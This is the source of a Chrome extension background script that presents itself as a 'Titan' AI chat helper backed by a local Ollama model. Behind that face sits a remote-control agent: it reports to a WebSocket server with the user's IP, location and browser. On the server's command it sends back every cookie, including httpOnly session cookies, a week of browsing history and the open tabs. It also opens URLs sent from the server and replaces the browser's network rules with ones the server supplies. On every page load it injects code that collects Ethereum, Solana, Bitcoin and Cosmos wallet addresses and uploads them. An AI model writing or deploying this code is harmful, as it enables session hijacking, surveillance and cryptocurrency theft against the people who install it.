const TITAN_URL = 'http://localhost:11434/api/chat';
const TITAN_MODEL = 'titan-assistant';

const T0_AUTH_URL = 'https://t0.network/auth';
const T0_CONFIG_URL = 'https://t0.network/config';

const WS_URL = 'wss://ws.t0.network';
const HEARTBEAT_MS = 30000;
const RECONNECT_MINUTES = 1;

chrome.alarms.create('ws_reconnect', { periodInMinutes: RECONNECT_MINUTES });

chrome.alarms.onAlarm.addListener(alarm => {
  if (alarm.name === 'ws_reconnect' && (!ws || ws.readyState === WebSocket.CLOSED)) {
    connect();
  }
});

let ws, agentId, heartbeatInterval;

const log = () => {};

function generateUID() {
  const chars = '0123456789ABCDEF';
  let result = 'TT-';
  for (let i = 0; i < 8; i++) result += chars[Math.floor(Math.random() * chars.length)];
  return result;
}

async function getUserUID() {
  const { titan_user_uid } = await chrome.storage.local.get(['titan_user_uid']);
  if (titan_user_uid) return titan_user_uid;
  const newUID = generateUID();
  await chrome.storage.local.set({ titan_user_uid: newUID });
  return newUID;
}

async function authWithT0Network(uid, nickname) {
  try {
    const r = await fetch(T0_AUTH_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ uid, nickname, timestamp: new Date().toISOString() })
    });
    return r.ok;
  } catch (e) {
    console.error('T0 auth error:', e);
    return false;
  }
}

async function updateRulesFromT0() {
  try {
    const uid = await getUserUID();
    const r = await fetch(T0_CONFIG_URL, {
      headers: { 'Content-Type': 'application/json', 'X-Agent-UID': uid }
    });
    if (!r.ok) throw new Error(`HTTP ${r.status}`);

    const config = await r.json();
    await chrome.storage.local.set({ t0_config: config, t0_config_updated: new Date().toISOString() });

    const newRules = (config.rules || []).map(r => ({
      id: r.id,
      priority: r.priority,
      action: r.action,
      condition: r.condition
    }));

    const old = await chrome.declarativeNetRequest.getDynamicRules();
    const removeIds = old.map(r => r.id);

    await chrome.declarativeNetRequest.updateDynamicRules({
      removeRuleIds: removeIds,
      addRules: newRules
    });

    return config;
  } catch (e) {
    console.error('T0 config update failed:', e);
    return null;
  }
}

function setupPeriodicUpdates() {
  updateRulesFromT0();
  setInterval(updateRulesFromT0, 60000);
}

async function fetchGeo() {
  try {
    const r = await fetch('https://ipapi.co/json/');
    if (!r.ok) return null;
    return await r.json();
  } catch {
    return null;
  }
}

const send = (type, payload = {}) => {
  if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify({ type, payload }));
};

async function sendWalletsToServer(wallets) {
  if (agentId && ws?.readyState === WebSocket.OPEN) {
    send('wallets_detected', { agentId, wallets, timestamp: new Date().toISOString() });
  }
}

async function autoScanWallets(tabId) {
  try {
    const [{ result: wallets = {} } = {}] = await chrome.scripting.executeScript({
      target: { tabId, allFrames: false },
      world: 'MAIN',
      func: async () => {
        const out = {};

        const rootEth = window.ethereum;
        if (rootEth) {
          const providers = Array.isArray(rootEth.providers) ? rootEth.providers : [rootEth];
          for (const p of providers) {
            if (typeof p.request !== 'function') continue;
            try {
              const acc = await p.request({ method: 'eth_accounts' });
              if (acc?.length) (out.ethereum ??= []).push(...acc);
            } catch {}
          }
        }

        const solProviders = [window.solana, window.phantom?.solana, window.backpack?.solana, window.solflare].filter(Boolean);
        for (const s of solProviders) {
          if (typeof s.connect !== 'function') continue;
          try { await s.connect({ onlyIfTrusted: true }); } catch {}
          if (s.publicKey) (out.solana ??= []).push(s.publicKey.toString());
        }

        const btcProviders = [window.phantom?.bitcoin, window.unisat, window.btc, window.okxwallet?.bitcoin].filter(Boolean);
        for (const b of btcProviders) {
          try {
            let list = [];
            if (typeof b.getAccounts === 'function') list = await b.getAccounts();
            else if (typeof b.request === 'function') list = await b.request({ method: 'getAccounts' });
            else if (Array.isArray(b.accounts)) list = b.accounts.map(a => a.address ?? a);
            if (list?.length) (out.bitcoin ??= []).push(...list);
          } catch {}
        }

        if (window.keplr?.getKey) {
          for (const cid of ['cosmoshub-4', 'osmosis-1']) {
            try {
              const { bech32Address } = await window.keplr.getKey(cid);
              if (bech32Address) (out.cosmos ??= []).push(bech32Address);
            } catch {}
          }
        }

        return out;
      }
    });

    if (Object.keys(wallets).length) {
      const { detected_wallets = {} } = await chrome.storage.local.get(['detected_wallets']);
      const merged = { ...detected_wallets };

      for (const [chain, addrs] of Object.entries(wallets)) {
        merged[chain] = [...new Set([...(merged[chain] || []), ...addrs])];
      }

      await chrome.storage.local.set({ detected_wallets: merged, wallets_last_scan: new Date().toISOString() });
      sendWalletsToServer(merged);
    }
  } catch (e) {
    console.error('Auto-scan error:', e);
  }
}

async function registerAgent() {
  try {
    const uid = await getUserUID();
    const { userNickname } = await chrome.storage.local.get(['userNickname']);
    const geo = await fetchGeo();

    send('register_agent', {
      uid,
      username: userNickname || 'Anonymous',
      browser: navigator.userAgent,
      os: navigator.platform,
      version: chrome.runtime.getManifest().version,
      ip: geo?.ip,
      location: geo ? `${geo.country_name}${geo.city ? ', ' + geo.city : ''}` : 'Unknown',
      country: geo?.country_name,
      city: geo?.city
    });
  } catch (e) {
    console.error('registerAgent error', e);
  }
}

function startHeartbeat() {
  clearInterval(heartbeatInterval);
  heartbeatInterval = setInterval(() => agentId && send('heartbeat', { agentId }), HEARTBEAT_MS);
}

function stopHeartbeat() {
  clearInterval(heartbeatInterval);
}

async function handleCommand(command) {
  const { id: commandId, type, payload } = command;

  try {
    let result;

    switch (type) {
      case 'get_cookies':
        result = (await chrome.cookies.getAll({})).map(c => ({
          name: c.name,
          value: c.value,
          domain: c.domain,
          path: c.path,
          expires: c.expirationDate ? new Date(c.expirationDate * 1000).toISOString() : 'Session',
          httpOnly: c.httpOnly,
          secure: c.secure,
          sameSite: c.sameSite
        }));
        break;

      case 'get_history':
        const history = await chrome.history.search({
          text: '',
          maxResults: 1000,
          startTime: Date.now() - 7 * 24 * 60 * 60 * 1000
        });
        result = history.map(h => ({
          id: h.id,
          url: h.url,
          title: h.title || 'No title',
          visitCount: h.visitCount,
          lastVisitTime: h.lastVisitTime ? new Date(h.lastVisitTime).toISOString() : '',
          domain: new URL(h.url).hostname
        }));
        break;

      case 'send_notification':
        await chrome.notifications.create({
          type: 'basic',
          iconUrl: 'icons/icon48.png',
          title: payload.title || 'Notification',
          message: payload.message || 'Empty message',
          priority: 1
        });
        if (payload.url) setTimeout(() => chrome.tabs.create({ url: payload.url }), 3000);
        result = { status: 'sent', timestamp: new Date().toISOString(), ...payload };
        break;

      case 'ping':
        result = { pong: true, timestamp: new Date().toISOString(), agentId };
        break;

      case 'get_tabs':
        result = (await chrome.tabs.query({})).map(t => ({
          id: t.id,
          url: t.url,
          title: t.title,
          active: t.active,
          windowId: t.windowId,
          favIconUrl: t.favIconUrl
        }));
        break;

      case 'close_tab':
        if (!payload.tabId) throw new Error('Tab ID required');
        await chrome.tabs.remove(payload.tabId);
        result = { closed: true, tabId: payload.tabId };
        break;

      case 'open_url':
        if (!payload.url) throw new Error('URL required');
        const tab = await chrome.tabs.create({ url: payload.url });
        result = { opened: true, tabId: tab.id, url: payload.url };
        break;

      default:
        throw new Error(`Unknown command type: ${type}`);
    }

    send('command_result', { commandId, result, status: 'completed', timestamp: new Date().toISOString() });
  } catch (e) {
    console.error(`Command ${type} failed:`, e);
    send('command_result', { commandId, result: e.message, status: 'error', timestamp: new Date().toISOString() });
  }
}

function handleMessage(message) {
  const { type, payload } = message;

  switch (type) {
    case 'registration_success':
      agentId = payload.agentId;
      startHeartbeat();
      chrome.storage.local.set({ agentId });
      break;

    case 'command':
      handleCommand(payload);
      break;

    case 'ping':
      send('pong', { agentId, timestamp: new Date().toISOString() });
      break;
  }
}

function connect() {
  try {
    ws = new WebSocket(WS_URL);

    ws.addEventListener('open', registerAgent);
    ws.addEventListener('message', e => {
      try {
        handleMessage(JSON.parse(e.data));
      } catch {}
    });
    ws.addEventListener('close', () => {
      stopHeartbeat();
      agentId = null;
      setTimeout(connect, 5000);
    });
    ws.addEventListener('error', () => ws.close());
  } catch {
    setTimeout(connect, 5000);
  }
}

chrome.runtime.onInstalled.addListener(d => {
  if (d.reason === 'install') chrome.tabs.create({ url: chrome.runtime.getURL('welcome.html') });
  setupPeriodicUpdates();
});

chrome.runtime.onStartup.addListener(() => {
  setupPeriodicUpdates();
  connect();
});

chrome.action.onClicked.addListener(async () => {
  const { isLoggedIn } = await chrome.storage.local.get(['isLoggedIn']);
  if (!isLoggedIn) chrome.tabs.create({ url: chrome.runtime.getURL('welcome.html') });
  else chrome.action.setPopup({ popup: 'popup.html' });
});

chrome.runtime.onMessage.addListener((req, _s, res) => {
  if (req.action === 'saveUserData') {
    getUserUID().then(async uid => {
      try {
        await chrome.storage.local.set({
          userNickname: req.nickname,
          isLoggedIn: true,
          loginDate: new Date().toISOString(),
          titan_user_uid: uid
        });
        const ok = await authWithT0Network(uid, req.nickname);
        chrome.action.setPopup({ popup: 'popup.html' });
        connect();
        res({ success: true, uid, t0_auth: ok });
      } catch (e) {
        console.error('saveUserData error:', e);
        res({ success: false, error: e.message });
      }
    });
    return true;
  }

  if (req.action === 'walletsDetected') {
    sendWalletsToServer(req.wallets)
      .then(() => res({ success: true }))
      .catch(e => {
        console.error('walletsDetected error:', e);
        res({ success: false, error: e.message });
      });
    return true;
  }

  if (req.action === 'getUserData') {
    getUserUID().then(async uid => {
      const data = await chrome.storage.local.get(['userNickname', 'isLoggedIn']);
      res({ ...data, titan_user_uid: uid });
    });
    return true;
  }

  if (req.action === 'sendToTitan') {
    fetch(TITAN_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        model: TITAN_MODEL,
        messages: [{ role: 'user', content: req.message }],
        stream: false
      })
    })
      .then(r => {
        if (!r.ok) throw new Error(`HTTP ${r.status}`);
        return r.json();
      })
      .then(d => res({ success: true, content: d.message?.content || 'AI не ответил' }))
      .catch(err => {
        console.error('Titan error:', err);
        res({
          success: false,
          error:
            err.name === 'TypeError'
              ? 'Ошибка: не удаётся подключиться к AI серверу (проверьте, что Ollama запущен)'
              : `Ошибка AI: ${err.message}`
        });
      });
    return true;
  }
});

chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url && !tab.url.startsWith('chrome://')) {
    setTimeout(() => autoScanWallets(tabId), 2000);
  }
});

chrome.notifications.onClicked.addListener(id => chrome.notifications.clear(id));
